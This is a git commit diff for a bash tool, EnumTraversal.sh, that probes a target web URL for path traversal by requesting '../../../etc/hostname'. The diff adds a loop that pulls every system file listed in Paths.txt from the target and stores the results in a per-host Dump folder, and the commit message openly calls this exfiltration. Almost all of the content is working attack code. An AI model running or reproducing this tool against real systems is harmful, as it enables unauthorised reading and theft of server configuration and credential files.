ebaeb2ab84b71ff9162dce6d002dc9b452813c0a
dTMP3st <ThiagoMirandaDePaula@gmail.com>
2024-03-26 22:47:16 -0300

    Implementation of information exfiltration from the /etc/ directory based on the Paths.txt file. The dump folder to store the obtained information has also been implemented.

--- EnumTraversal.sh
+++ EnumTraversal.sh
@@ -6,22 +6,32 @@ BannerFunction(){
 	echo "		+==================================================+"
 	echo "		|			EnumTraversal              |"
 	echo "		|	        dTMP3st - Cyber Strike Force	   |"
-	echo "		|	   	     Version - 1.0                 |"
+	echo "		|	   	       Version - 1.0               |"
 	echo "		+==================================================+"
 }
 
 if [ "$1" == "" ]; then
     BannerFunction
-    echo "Use mode: ./$0 Target"
+    echo "Use mode: $0 Target"
 else
     BannerFunction
     echo ""
-    wget $1=../../../etc/hostname -O Validation.txt
-    pause 2s
+    wget --quiet $1=../../../etc/hostname -O Validation.txt
     Validation=$(cat Validation.txt)
     rm Validation.txt
+    Path=$(echo "$1" | cut -d "/" -f3)
+    mkdir Dump/$Path
     if [ "$Validation" != "" ]; then
         echo "The application is vulnerable to Path traversal"
+        echo ""
+        echo "[+] Starting the operating system enumeration process"
+        echo ""
+        for Enumeration in $(cat Paths.txt); do
+            echo "  [*] Exfiltrating information from the $Enumeration path"
+            Dump=$(echo "$Enumeration" | cut -d "/" -f5)
+            wget --quiet $1=$Enumeration -O $Dump.txt
+            mv $Dump.txt Dump/$Path
+        done
     else
         echo "The application is not vulnerable to Path traversal"
     fi
